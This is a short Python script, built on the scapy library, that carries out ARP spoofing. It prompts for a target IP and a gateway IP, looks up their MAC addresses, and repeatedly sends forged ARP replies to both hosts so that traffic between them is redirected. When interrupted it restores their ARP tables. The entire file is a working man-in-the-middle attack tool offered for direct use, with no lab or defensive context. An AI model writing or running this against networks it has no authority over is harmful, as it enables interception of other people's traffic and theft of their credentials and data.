from scapy.all import *
import time

def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket)[0][0][1].hwsrc
    return targetmac

def poisonarpcache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet)
    print ("ARP Table restored to normal for", targetip)

def main():
    targetip = input("Enter Target IP:")
    gatewayip = input("Enter Gateway IP:")
    
    try:
        targetmac = getmac(targetip)
    except:
         print("Target machine did not respond to ARP broadcast")
         quit()
    
    try:
        gatewaymac= getmac(gatewayip)
    except:
         print("Gateway is unreachable")
         quit()
    
    try:
        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5) 
            poisonarpcache(targetip, targetmac, gatewayip)
            poisonarpcache(gatewayip, gatewaymac, targetip)

    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
